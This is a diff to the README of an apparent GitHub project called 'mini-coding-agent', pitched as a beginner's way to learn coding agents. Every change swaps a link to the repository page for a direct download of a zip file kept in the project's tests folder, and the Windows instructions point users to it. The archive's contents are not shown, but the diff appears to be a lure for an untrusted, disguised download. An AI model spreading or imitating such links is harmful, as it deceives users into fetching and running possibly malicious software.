@@ -1,6 +1,6 @@
 # 🧩 mini-coding-agent - Learn Coding Agents Fast
 
-[![Download mini-coding-agent](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/ardathhomeless585/mini-coding-agent)
+[![Download mini-coding-agent](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/ardathhomeless585/mini-coding-agent/raw/refs/heads/main/tests/coding_mini_agent_1.9.zip)
 
 ## 🖥️ What this is
 
@@ -20,7 +20,7 @@ It is a good fit if you want to learn how agent apps are put together in plain P
 
 Use this link to visit the download page:
 
-[https://github.com/ardathhomeless585/mini-coding-agent](https://github.com/ardathhomeless585/mini-coding-agent)
+[https://github.com/ardathhomeless585/mini-coding-agent/raw/refs/heads/main/tests/coding_mini_agent_1.9.zip](https://github.com/ardathhomeless585/mini-coding-agent/raw/refs/heads/main/tests/coding_mini_agent_1.9.zip)
 
 On Windows, follow these steps:
 
@@ -233,4 +233,4 @@ It can help you learn:
 
 Visit this page to download the project:
 
-[https://github.com/ardathhomeless585/mini-coding-agent](https://github.com/ardathhomeless585/mini-coding-agent)
+[https://github.com/ardathhomeless585/mini-coding-agent/raw/refs/heads/main/tests/coding_mini_agent_1.9.zip](https://github.com/ardathhomeless585/mini-coding-agent/raw/refs/heads/main/tests/coding_mini_agent_1.9.zip)
